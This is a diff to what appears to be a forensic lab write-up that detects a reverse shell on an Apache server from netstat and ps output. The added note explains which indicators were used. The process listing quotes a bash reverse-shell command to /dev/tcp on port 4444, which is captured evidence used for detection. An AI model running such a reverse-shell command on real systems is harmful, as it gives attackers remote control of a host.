@@ -1,3 +1,13 @@
+Note for the humans, don't feed this to GPT:
+For the detection of the reverse shell opening, informations from
+the 'ps -aux' and 'netstat -tunapl' commands were used. Specifically,
+the line: "tcp 0 0 192.168.92.135:49582 192.168.92.133:4444 ESTABLISHED - "
+from the netstat result is one of the indicators. The result of the 
+'ps -aux' command was filtered to display only the relevant lines.
+The fact that the attacker uploaded a file to the _uploaded folder of
+the Apache server (as seen in the '4_apache_web_server_file_upload' file)
+also contributes to the conclusion that a reverse shell was opened.
+
 [result of the netstat -tunapl command]
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
@@ -27,5 +37,3 @@ udp        0      0 0.0.0.0:17500           0.0.0.0:*                           
 www-data  158053  0.0  0.0   2580  1408 ?        S    15:02   0:00 sh -c /bin/bash -c 'bash -i >& /dev/tcp/192.168.92
 www-data  158054  0.0  0.1   3952  2816 ?        S    15:02   0:00 /bin/bash -c bash -i >& /dev/tcp/192.168.92.133/44
 www-data  158055  0.0  0.1   4216  3328 ?        S    15:02   0:00 bash -i
-
-Note: The fact that the attacker uploaded a file to the _uploaded folder of the Apache server (as seen in the '4_apache_web_server_file_upload' file) also contributes to the conclusion that a reverse shell was opened.  
